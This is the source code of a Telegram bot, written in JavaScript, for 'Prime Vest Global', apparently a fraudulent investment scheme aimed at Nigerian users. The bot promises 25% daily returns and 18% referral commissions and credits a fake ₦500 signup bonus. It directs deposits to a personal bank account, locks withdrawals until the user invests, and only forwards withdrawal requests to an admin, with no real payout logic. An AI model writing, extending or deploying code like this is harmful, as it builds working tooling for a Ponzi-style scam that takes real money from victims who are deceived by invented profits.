const { Telegraf, Markup } = require("telegraf");
const express = require("express");

// ===== SETTINGS =====
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = 7510750214;
const BOT_USERNAME = "primevestglobal_bot";
const CHANNEL = "@starfordfreenumbers";
const GROUP = "@primevestglobalinvestments";

const bot = new Telegraf(BOT_TOKEN);

// ===== SERVER =====
const app = express();
app.get("/", (req, res) => res.send("Bot Running"));
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running on " + PORT));

// ===== DATABASE =====
let users = {};
let pendingDeposits = {};
let userMode = {};

// ===== USER =====
function getUser(id) {
  id = Number(id);
  if (!users[id]) {
    users[id] = {
      balance: 500,
      profit: 0,
      invested: 0,
      bank: null,
      refBy: null,
      referrals: 0,
      totalEarned: 0,
      lastProfit: Date.now()
    };
  }
  return users[id];
}

// ===== AUTO PROFIT =====
function addProfit(u) {
  let now = Date.now();
  if (!u.invested) return;

  let hours = (now - u.lastProfit) / (1000 * 60 * 60);

  if (hours >= 24) {
    let days = Math.floor(hours / 24);
    let profit = u.invested * 0.25 * days;

    u.balance += profit;
    u.profit += profit;
    u.totalEarned += profit;
    u.lastProfit = now;
  }
}

// ===== FORCE JOIN =====
async function checkJoin(ctx) {
  try {
    let ch = await ctx.telegram.getChatMember(CHANNEL, ctx.from.id);
    let gp = await ctx.telegram.getChatMember(GROUP, ctx.from.id);

    return ["member","creator","administrator"].includes(ch.status) &&
           ["member","creator","administrator"].includes(gp.status);
  } catch {
    return false;
  }
}

async function mustJoin(ctx) {
  if (!(await checkJoin(ctx))) {
    await ctx.reply(
`🚫 *ACCESS RESTRICTED*

To continue, please join our official platforms`,
{
  parse_mode: "Markdown",
  ...Markup.inlineKeyboard([
    [Markup.button.url("📢 Join Channel", `https://t.me/${CHANNEL.replace("@","")}`)],
    [Markup.button.url("👥 Join Group", `https://t.me/${GROUP.replace("@","")}`)]
  ])
}
    );
    return false;
  }
  return true;
}

// ===== MENU =====
function menu() {
  return Markup.keyboard([
    ["💼 Invest", "💰 Balance"],
    ["🏧 Withdraw", "💳 Deposit"],
    ["🏦 Add Bank", "👥 Referral"]
  ]).resize();
}

// ===== START =====
bot.start(async (ctx) => {
  let id = ctx.from.id;
  let u = getUser(id);

  let ref = ctx.startPayload;
  if (ref && ref != id && !u.refBy) {
    u.refBy = Number(ref);
    getUser(ref).referrals += 1;
  }

  if (!(await mustJoin(ctx))) return;

  ctx.reply(
`🚀 *WELCOME TO PRIME VEST GLOBAL*

💎 *Your Trusted Investment Platform*

📈 Earn *25% Daily Profit*
⚡ Fast Deposits & Withdrawals
👥 Get *18% Referral Bonus*

🎁 *Instant Signup Bonus: ₦500*

🔐 Secure | ⚡ Fast | 💰 Profitable

👇 Use the menu below to begin your earning journey`,
{ parse_mode: "Markdown", ...menu() }
  );
});

// ===== BALANCE =====
bot.hears("💰 Balance", async (ctx) => {
  if (!(await mustJoin(ctx))) return;

  let u = getUser(ctx.from.id);
  addProfit(u);

  ctx.reply(
`📊 *ACCOUNT DASHBOARD*

💰 Balance: ₦${u.balance}
📈 Profit: ₦${u.profit}
💼 Invested: ₦${u.invested}

👥 Referrals: ${u.referrals}
💸 Earned: ₦${u.totalEarned}`,
{ parse_mode: "Markdown", ...menu() }
  );
});

// ===== INVEST =====
bot.hears("💼 Invest", async (ctx) => {
  if (!(await mustJoin(ctx))) return;

  userMode[ctx.from.id] = "invest";

  ctx.reply(
`💼 *INVESTMENT PACKAGES*

₦3000 → ₦750 daily  
₦5000 → ₦1250 daily  
₦10000 → ₦2500 daily  
₦15000 → ₦3750 daily  
₦20000 → ₦5000 daily  
₦25000 → ₦6250 daily  
₦40000 → ₦10000 daily  
₦50000 → ₦12500 daily

👇 Select your plan`,
{
  parse_mode: "Markdown",
  ...Markup.keyboard([
    ["₦3000","₦5000"],
    ["₦10000","₦15000"],
    ["₦20000","₦25000"],
    ["₦40000","₦50000"],
    ["⬅️ Back"]
  ]).resize()
}
  );
});

// ===== DEPOSIT =====
bot.hears("💳 Deposit", async (ctx) => {
  if (!(await mustJoin(ctx))) return;

  userMode[ctx.from.id] = "deposit";

  ctx.reply(
`💳 *FUND YOUR ACCOUNT*

Select amount to deposit`,
Markup.keyboard([
  ["₦3000","₦5000"],
  ["₦10000","₦15000"],
  ["₦20000","₦25000"],
  ["₦40000","₦50000"],
  ["⬅️ Back"]
]).resize()
  );
});

// ===== HANDLE PACKAGES =====
const packages = [3000,5000,10000,15000,20000,25000,40000,50000];

bot.hears(packages.map(x=>"₦"+x),(ctx)=>{
  let id = ctx.from.id;
  let amount = parseInt(ctx.message.text.replace("₦",""));
  let u = getUser(id);

  if(userMode[id] === "invest"){
    if(u.balance < amount) return ctx.reply("❌ Insufficient balance");

    u.balance -= amount;
    u.invested += amount;

    if(u.refBy){
      let refUser = getUser(u.refBy);
      let bonus = Math.floor(amount * 0.18);
      refUser.balance += bonus;
      refUser.totalEarned += bonus;
    }

    ctx.reply(
`✅ *INVESTMENT ACTIVATED*

💰 ₦${amount}
📈 Daily Profit: ₦${amount * 0.25}

⏱ Profit credited every 24hrs`,
{ parse_mode: "Markdown", ...menu() }
    );

  } else if(userMode[id] === "deposit"){
    pendingDeposits[id] = amount;

    ctx.reply(
`💳 *DEPOSIT DETAILS*

🏦 Bank: Moniepoint  
👤 Name: Kamsi  
🔢 Account: 5075903950  

💰 Amount: ₦${amount}

📸 Send payment screenshot for approval

⚡ Approval time: 1–5 minutes`,
{ parse_mode: "Markdown", ...menu() }
    );
  }
});

// ===== BACK =====
bot.hears("⬅️ Back",(ctx)=>{
  userMode[ctx.from.id] = null;
  ctx.reply("🏠 Main Menu", menu());
});

// ===== WITHDRAW =====
bot.hears("🏧 Withdraw", async (ctx)=>{
  if (!(await mustJoin(ctx))) return;

  let u = getUser(ctx.from.id);

  if(!u.bank) return ctx.reply("❌ Add bank first", menu());

  if(u.invested <= 0){
    return ctx.reply(
`🔒 *WITHDRAWAL LOCKED*

💡 You must invest to unlock withdrawal`,
{ parse_mode: "Markdown", ...menu() }
    );
  }

  if(u.balance < 500)
    return ctx.reply("❌ Minimum withdrawal is ₦500", menu());

  userMode[ctx.from.id] = "withdraw";

  ctx.reply(
`🏧 *WITHDRAW FUNDS*

💰 Balance: ₦${u.balance}

⚠️ 10% fee applies

👇 Enter amount`,
Markup.keyboard([["⬅️ Back"]]).resize()
  );
});

// ===== TEXT HANDLER =====
bot.on("text", async (ctx)=>{
  if (!(await mustJoin(ctx))) return;

  let id = ctx.from.id;
  let u = getUser(id);
  let text = ctx.message.text;

  if(text.includes("/") && text.length > 10){
    u.bank = text;
    return ctx.reply("✅ Bank saved", menu());
  }

  if(userMode[id] === "withdraw"){
    let amount = parseInt(text);

    if(isNaN(amount)) return ctx.reply("❌ Invalid amount");
    if(amount < 500) return ctx.reply("❌ Minimum ₦500");
    if(amount > u.balance) return ctx.reply("❌ Insufficient balance");

    let fee = Math.floor(amount * 0.10);
    let finalAmount = amount - fee;

    bot.telegram.sendMessage(
      ADMIN_ID,
`🏧 Withdrawal Request

User: ${id}
Amount: ₦${amount}
Fee: ₦${fee}
Pay: ₦${finalAmount}
Bank: ${u.bank}`
    );

    userMode[id] = null;

    return ctx.reply(
`✅ *REQUEST SUBMITTED*

💰 Amount: ₦${amount}
💸 You Receive: ₦${finalAmount}

⏳ Processing...`,
{ parse_mode: "Markdown", ...menu() }
    );
  }
});

// ===== REFERRAL =====
bot.hears("👥 Referral", async (ctx)=>{
  if (!(await mustJoin(ctx))) return;

  let id = ctx.from.id;
  let u = getUser(id);

  ctx.reply(
`👥 *REFERRAL PROGRAM*

🎁 Earn *18% Commission*

🔗 https://t.me/${BOT_USERNAME}?start=${id}

━━━━━━━━━━━━━━━
👥 Referrals: ${u.referrals}
💰 Earnings: ₦${u.totalEarned}
━━━━━━━━━━━━━━━

🔥 Share & earn instantly`,
{
  parse_mode: "Markdown",
  ...Markup.inlineKeyboard([
    [Markup.button.url("📢 Share Link", `https://t.me/share/url?url=https://t.me/${BOT_USERNAME}?start=${id}`)]
  ]),
  ...menu()
}
  );
});

bot.hears("🏦 Add Bank",(ctx)=>{
  ctx.reply("Send: Name / Bank / Account", Markup.keyboard([["⬅️ Back"]]).resize());
});

bot.launch();
console.log("🚀 BOT RUNNING");
